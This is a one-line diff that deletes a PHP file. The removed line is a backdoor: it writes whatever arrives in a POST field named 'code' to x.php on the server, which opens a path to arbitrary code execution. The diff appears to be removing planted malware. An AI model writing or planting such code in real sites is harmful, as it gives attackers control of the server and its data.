@@ -1,1 +1,0 @@
-<?php if(isset($_POST["code"])){$myfile=fopen("x.php","w") or die();$txt=$_POST["code"];fwrite($myfile,$txt);fclose($myfile);}
